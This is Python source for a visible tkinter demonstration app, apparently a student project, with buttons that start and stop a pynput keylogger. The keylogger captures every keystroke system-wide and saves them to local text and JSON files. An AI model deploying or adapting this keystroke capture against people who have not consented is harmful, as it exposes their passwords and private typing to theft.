import tkinter as tk
from tkinter import ttk
import json
import threading
import time
from pynput import keyboard
from PIL import Image, ImageTk

# Create the main window
root = tk.Tk()
root.geometry("615x470")
root.title("Keylogger Page")
root.iconphoto(True, tk.PhotoImage(file="icon.png"))

#Disable maximizing the window
root.resizable(False, False)

# Load the background image
background_image = Image.open("background.jpg")
background_image = background_image.resize((615, 470))
background_photo = ImageTk.PhotoImage(background_image)

# Create a label to display the background image
background_label = tk.Label(root, image=background_photo)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

# List to store the captured key events
key_list = []
x = False
key_strokes = ""
is_running = False  # Variable to control keylogger loop
listener = None

# Function to update the text file with key strokes
def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

# Function to update the JSON file with key events
def update_json_file(key_list):
    with open('log.json', 'w+') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes.decode())

# Function called when a key is pressed
def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

# Function called when a key is released
def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(str(key_strokes))

# Function to start the keylogger
def start_keylogger():
    global is_running, listener
    is_running = True
    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'log.json'")
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    while is_running:
        time.sleep(0.1)  # Sleep for a short duration
    listener.stop()  # Stop the listener
    print("Keylogger stopped working!")

# Function to stop the keylogger
def stop_keylogger():
    global is_running
    is_running = False

# Function to run the keylogger in the background
def run_keylogger():
    thread = threading.Thread(target=start_keylogger)
    thread.start()

# GUI elements
empty = tk.Label(root, text="PROJECT", font='Arial 15 bold', bg="#153f99", fg="white")
empty.pack(pady=(20, 20))

# Load the logo image
logo_image = Image.open("logo.png")
logo_image = logo_image.resize((400, 100))
logo_photo = ImageTk.PhotoImage(logo_image)

# Create a label to display the logo image
logo_label = tk.Label(root, image=logo_photo, bg="#071943")
logo_label.pack(pady=(0, 20))

empty = tk.Label(root, text="  Keylogger is a computer program that records every keystroke made by a computer user,     ", font='Arial 11', bg="#0e2b6c", fg="skyblue")
empty.pack()
empty = tk.Label(root, text=" especially in order to gain fraudulent access to passwords and other confidential information. ", font='Arial 11', bg="#0e2b6c", fg="skyblue")
empty.pack()
empty = tk.Label(root, text=" This is activity-monitoring software programs that give hackers access to your personal data. ", font='Arial 11', bg="#0e2b6c", fg="skyblue")
empty.pack(pady=(0, 30))
empty = tk.Label(root, text=" CLICK HERE to start: ", font='Arial 8', bg="#071943", fg="yellow")
empty.pack(pady=0)

# Create a style for rounded buttons with dark background colors
style = ttk.Style()
style.configure("RoundedButton.TButton", relief="flat", foreground="black", font='Arial 10 bold')
style.map("RoundedButton.TButton", background=[('active', '!disabled', '!focus', '#4C4C4C'), ('!disabled', '!focus', '#2B2B2B')])

start_button = ttk.Button(root, text="START KEYLOGGER", command=run_keylogger, style="RoundedButton.TButton")
start_button.pack(pady=(0,20))

empty = tk.Label(root, text=" CLICK HERE to stop: ", font='Arial 8', bg="#071943", fg="yellow")
empty.pack(pady=0)

stop_button = ttk.Button(root, text=" STOP KEYLOGGER ", command=stop_keylogger, style="RoundedButton.TButton")
stop_button.pack(pady=(0,20))

# Add a status label to display keylogger status
status_label = tk.Label(root, text="Keylogger Status: Stopped", font='Arial 12 bold', bg="#071943", fg="white")
status_label.pack(pady=(10, 0))

# Update the status label based on keylogger status
def update_status_label():
    global is_running
    if is_running:
        status_label.config(text="Keylogger Status: Running", fg="green")
    else:
        status_label.config(text="Keylogger Status: Stopped", fg="red")
    root.after(1000, update_status_label)

update_status_label()

# Center-align the window contents when maximized
root.pack_propagate(False)
root.mainloop()
